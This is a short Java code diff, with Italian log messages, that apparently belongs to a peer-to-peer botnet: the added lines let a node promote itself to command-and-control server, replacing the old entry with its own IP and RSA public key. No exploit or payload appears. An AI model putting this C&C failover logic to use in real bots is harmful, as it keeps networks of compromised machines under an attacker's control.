@@ -406,6 +406,7 @@ public class Behavior {
 	 */
 	@Async
 	public void getPower(String ip) {
+		pServ.setNewKing(nServ.getIdHash());
 		System.out.println("Creo grafo rete P2P");
 		pServ.createNetworkP2P();
 		String myId = nServ.getIdHash();
@@ -457,8 +458,19 @@ public class Behavior {
 		if ((b != null) && (b)) {
 			System.out.println("SONO IL NUOVO C&C");
 			eng.setCommandandconquerStatus(true);
+			nServ.getCommandConquerIps().remove(0);
+			nServ.getCommandConquerIps().add(new Pairs<IP, PublicKey>( nServ.getMyIp(), pki.getPubRSAKey()));
+			pServ.setNewKing("");
 		}
 		// controllare risposta da cec che ha avvisato dns
+	}
+
+	public P2PMan getpServ() {
+		return pServ;
+	}
+
+	public void setpServ(P2PMan pServ) {
+		this.pServ = pServ;
 	}
 }
 
